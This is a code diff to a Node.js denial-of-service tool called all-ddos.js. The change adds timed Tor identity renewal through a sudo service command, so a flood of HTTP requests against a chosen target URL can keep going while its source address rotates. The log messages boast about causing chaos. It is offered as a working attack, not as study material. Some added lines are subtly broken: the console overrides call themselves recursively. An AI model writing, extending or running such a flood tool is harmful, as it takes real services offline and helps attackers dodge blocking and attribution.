@@ -16,6 +16,7 @@
  const { URL } = require('url'); // For robust URL parsing
  const dns = require('dns').promises; // Async DNS resolution
  const { SocksProxyAgent } = require('socks-proxy-agent'); // Import SocksProxyAgent
+ const { exec } = require('child_process'); // For running external commands (like Tor's renewidentity)
  
 
  const targetURL = process.argv[2]; // Get target URL from command line
@@ -24,10 +25,11 @@
  const torProxy = 'socks5h://127.0.0.1:9050'; // Default Tor proxy, adjust if needed
  const maxRequestsPerMinute = process.argv[4] || 5000; // Limit requests per minute
  const attackDuration = process.argv[5] || 60; // Attack duration in seconds (default 60)
+ const torIdentityInterval = process.argv[6] || 30; // Tor identity renewal interval in seconds
  
 
  if (!targetURL) {
-  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration]"));
+  console.log(chalk.red.bold("Usage: node all-ddos.js <target_url> [threads] [maxRequestsPerMinute] [duration] [torIdentityInterval]"));
   process.exit(1);
  }
  
@@ -41,7 +43,7 @@
  }
  
 
- console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Cranking it to ${maxRequestsPerMinute} requests per minute. Prepare for some fucking chaos. Press Ctrl+C to stop.`));
+ console.log(chalk.green.bold(`Starting DDoS attack on ${targetURL} with ${threads} threads. Cranking it to ${maxRequestsPerMinute} requests per minute. Tor identity will renew every ${torIdentityInterval} seconds. Prepare for some fucking chaos. Press Ctrl+C to stop.`));
  
 
  let requestCount = 0; // Initialize the request counter
@@ -147,7 +149,24 @@
  }
  
 
+ function renewTorIdentity() {
+  exec('sudo /usr/sbin/service tor reload', (error, stdout, stderr) => {
+  if (error) {
+  logAction(chalk.red(`Failed to renew Tor identity: ${error.message}`));
+  return;
+  }
+  logAction(chalk.purple('Tor identity renewed, hopefully those bastards are still dealing with my shit.'));
+  });
+ }
+ 
+
  setInterval(flood, 5); // Adjust timing to your fucking liking, but go fuckin' nuts
+ 
+
+ // Renew Tor identity at intervals
+ if (onion) {
+  setInterval(renewTorIdentity, torIdentityInterval * 1000);
+ }
  
 
  // Stop the attack after a specified duration
@@ -167,3 +186,15 @@
   process.exit();
   });
  });
+ 
+
+ // Apply color scheme using chalk
+ console.log = (message) => {
+  console.log(chalk.keyword('darkgreen')(message));
+ };
+ console.error = (message) => {
+  console.error(chalk.keyword('darkred')(message));
+ };
+ console.warn = (message) => {
+  console.warn(chalk.keyword('purple')(message));
+ };
